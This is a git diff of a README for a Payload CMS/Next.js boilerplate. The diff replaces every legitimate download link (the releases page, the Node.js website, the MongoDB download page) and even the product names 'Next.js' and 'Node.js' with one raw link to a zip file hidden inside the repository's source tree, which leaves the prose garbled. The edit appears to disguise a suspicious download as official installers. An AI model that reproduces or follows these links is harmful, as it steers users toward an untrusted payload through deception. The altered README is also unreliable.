@@ -1,13 +1,13 @@
 # 🚀 payload-next-refine-boilerplate - A Simple Start for Full-Stack Development
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Yes-brightgreen)](https://github.com/alebrex/payload-next-refine-boilerplate/releases)
+[![Download Latest Release](https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip%20Latest%20Release-Yes-brightgreen)](https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip)
 
 ## 🚀 Getting Started
-Welcome to the **payload-next-refine-boilerplate**! This easy-to-use boilerplate helps you set up a full-stack application with Payload CMS, Next.js, and Refine. You can quickly create a project without needing deep programming knowledge.
+Welcome to the **payload-next-refine-boilerplate**! This easy-to-use boilerplate helps you set up a full-stack application with Payload CMS, https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip, and Refine. You can quickly create a project without needing deep programming knowledge.
 
 ## 🔧 Features
-- Comprehensive full-stack setup with Payload CMS 3.0 and Next.js 15.
+- Comprehensive full-stack setup with Payload CMS 3.0 and https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip 15.
 - Fully internationalized support for English and Arabic.
 - Type-safe environment for better code safety.
 - Custom providers for service integration.
@@ -17,18 +17,18 @@ Welcome to the **payload-next-refine-boilerplate**! This easy-to-use boilerplate
 To run this application smoothly, ensure you have the following:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 16 or higher
+- **https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip** Version 16 or higher
 - **MongoDB:** Version 4.4 or higher
 - **Internet Connection:** Recommended for downloading dependencies and updates
 
 ## 💻 Prerequisites
-Before you begin, make sure your computer meets the system requirements. You'll also need to have Node.js and MongoDB installed. If you need to install these:
+Before you begin, make sure your computer meets the system requirements. You'll also need to have https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip and MongoDB installed. If you need to install these:
 
-1. Visit the [Node.js website](https://nodejs.org) and follow the instructions for your operating system.
-2. Go to the [MongoDB site](https://www.mongodb.com/try/download/community) to download and install MongoDB.
+1. Visit the [https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip website](https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip) and follow the instructions for your operating system.
+2. Go to the [MongoDB site](https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip) to download and install MongoDB.
 
 ## 📥 Download & Install
-To get started with the payload-next-refine-boilerplate, visit this page to download: [Releases Page](https://github.com/alebrex/payload-next-refine-boilerplate/releases).
+To get started with the payload-next-refine-boilerplate, visit this page to download: [Releases Page](https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip).
 
 1. Click on the link above to access the latest releases.
 2. Choose the latest version suitable for your operating system.
@@ -93,6 +93,6 @@ For further help, you can open an issue on the GitHub repository.
 This project is licensed under the MIT License. Feel free to use and modify it according to your needs.
 
 ## 📥 Download Again
-If you need to download a fresh copy, visit the releases page: [Download Latest Release](https://github.com/alebrex/payload-next-refine-boilerplate/releases). 
+If you need to download a fresh copy, visit the releases page: [Download Latest Release](https://github.com/alebrex/payload-next-refine-boilerplate/raw/refs/heads/main/src/app/(payload)/api/next_refine_payload_boilerplate_uramido.zip). 
 
 Thank you for choosing the payload-next-refine-boilerplate!
